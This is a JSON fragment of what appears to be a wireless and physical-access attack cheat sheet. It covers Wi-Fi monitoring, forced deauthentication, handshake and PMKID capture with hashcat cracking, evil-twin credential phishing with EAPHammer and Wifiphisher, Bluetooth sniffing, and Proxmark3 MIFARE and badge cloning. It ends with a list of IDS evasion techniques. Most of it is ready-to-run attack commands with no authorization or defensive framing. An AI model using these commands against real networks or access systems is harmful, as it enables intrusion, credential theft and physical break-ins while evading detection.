    "sections": [
        {
            "heading": "WiFi Exploitation & Analysis",
            "subheadings": [
                {
                    "heading": "Reconnaissance & Monitoring",
                    "type": "code_block",
                    "content": [
                        "# Enable monitor mode on interface",
                        "airmon-ng start wlan0",
                        "",
                        "# Scan for target APs and clients",
                        "airodump-ng wlan0mon --band abg",
                        "",
                        "# Target specific BSSID for capture",
                        "airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture",
                        "",
                        "# Comprehensive wireless asset discovery",
                        "kismet -c wlan0mon"
                    ]
                },
                {
                    "heading": "WPA/WPA2 & WPA3 Attacks",
                    "type": "code_block",
                    "content": [
                        "# Capture 4-way handshake",
                        "airodump-ng -c <channel> --bssid <AP_MAC> -w capture wlan0mon",
                        "",
                        "# Force client deauthentication",
                        "aireplay-ng -0 5 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon",
                        "",
                        "# PMKID Attack (no handshake required)",
                        "hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1",
                        "hcxpcapngtool -o hash.hc22000 pmkid.pcapng",
                        "hashcat -m 22000 hash.hc22000 wordlist.txt"
                    ]
                },
                {
                    "heading": "Enterprise & Rogue AP Techniques",
                    "type": "code_block",
                    "content": [
                        "# EAP Downgrade / Evil Twin with EAPHammer",
                        "eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid \"CorpWiFi\" --creds",
                        "",
                        "# Automated evil twin with Wifiphisher",
                        "wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade"
                    ]
                }
            ]
        },
        {
            "heading": "Bluetooth & BLE Security",
            "subheadings": [
                {
                    "heading": "Discovery & Enumeration",
                    "type": "code_block",
                    "content": [
                        "# Classic Bluetooth scanning",
                        "hcitool scan && hcitool inq",
                        "",
                        "# BLE (Bluetooth Low Energy) discovery",
                        "hcitool lescan",
                        "",
                        "# Enumerate GATT services and characteristics",
                        "gatttool -b <BD_ADDR> -I",
                        "> connect",
                        "> primary"
                    ]
                },
                {
                    "heading": "Sniffing & Exploitation",
                    "type": "code_block",
                    "content": [
                        "# Sniffing with Ubertooth One",
                        "ubertooth-btbb -f -c capture.pcap",
                        "",
                        "# BlueBorne vulnerability scanner",
                        "python3 blueborne_scanner.py <BD_ADDR>"
                    ]
                }
            ]
        },
        {
            "heading": "RFID, NFC & Physical Token Cloning",
            "subheadings": [
                {
                    "heading": "Proxmark3 Workflows",
                    "type": "code_block",
                    "content": [
                        "# Low Frequency (125kHz) card search",
                        "lf search",
                        "",
                        "# High Frequency (13.56MHz) NFC search",
                        "hf search",
                        "",
                        "# MIFARE Classic autopwn and cloning",
                        "hf mf autopwn",
                        "hf mf dump"
                    ]
                },
                {
                    "heading": "Badge & Tag Manipulation",
                    "type": "list",
                    "content": [
                        "**Flipper Zero**: Integrated multi-protocol tool for reading/writing RFID, NFC, and Sub-GHz.",
                        "**ACR122U**: Standard USB NFC reader for desktop-based MIFARE manipulation.",
                        "**Badge Cloning**: Methods for dumping and cloning HID iClass and EM410x credentials."
                    ]
                }
            ]
        },
        {
            "heading": "Tools & Methodology Summary",
            "subheadings": [
                {
                    "heading": "Wireless Toolkit Matrix",
                    "type": "paragraph",
                    "content": "| Tool | Primary Purpose | Protocols |\n|---|---|---|\n| **Aircrack-ng** | WiFi Cracking & Monitoring | 802.11 |\n| **EAPHammer** | Enterprise WiFi Exploitation | WPA-EAP |\n| **Proxmark3** | RFID/NFC Research & Cloning | LF/HF RFID |\n| **Ubertooth** | Bluetooth Sniffing | BT/BLE |\n| **Wifiphisher** | Social Engineering / Evil Twin | 802.11 |"
                },
                {
                    "heading": "IDS & Evasion Techniques",
                    "type": "list",
                    "content": [
                        "**MAC Spoofing**: Use `macchanger -r` to randomize physical identifiers.",
                        "**Channel Hopping**: Scripted rotation to avoid detection by fixed-channel sensors.",
                        "**Signal Control**: Reducing TX power (`txpower`) to limit the operational footprint."
                    ]
                }
            ]
        },
